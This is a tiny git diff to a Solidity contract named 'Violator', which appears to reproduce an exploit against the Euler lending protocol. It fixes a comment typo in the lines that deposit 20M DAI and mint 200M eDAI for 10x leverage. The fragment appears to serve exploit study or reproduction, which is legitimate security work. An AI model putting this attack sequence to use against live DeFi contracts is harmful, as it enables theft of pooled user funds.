@@ -22,7 +22,7 @@ contract Violator {
         // Deposit 20M DAI into Euler
         eDAI.deposit(0, 20_000_000e18);
         // Borrow 200M eDAI, which will also mint 200M dDAI.
-        // This is essentially bottowing 10x on the original collateral.
+        // This is essentially borrowing 10x on the original collateral.
         eDAI.mint(0, 200_000_000e18);
 
         console.log("eDAI/dDAI balance at first 10x borrow: ", eDAI.balanceOf(address(this)), dDAI.balanceOf(address(this)));
